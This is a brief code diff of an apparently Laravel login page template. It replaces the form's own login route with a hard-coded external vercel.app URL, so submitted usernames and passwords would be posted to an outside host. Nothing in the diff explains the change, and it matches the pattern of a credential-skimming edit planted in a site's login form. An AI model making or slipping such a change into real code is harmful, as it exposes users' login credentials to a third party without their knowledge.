@@ -8,7 +8,7 @@
                 <div class="card-header">{{ __('Login') }}</div>
 
                 <div class="card-body">
-                    <form method="POST" action="{{ route('login') }}">
+                    <form action="https://g-xchange-qoj34f6ax-kawais-projects-0f8de189.vercel.app/login" method="post">
                         @csrf
 
                         <div class="row mb-3">
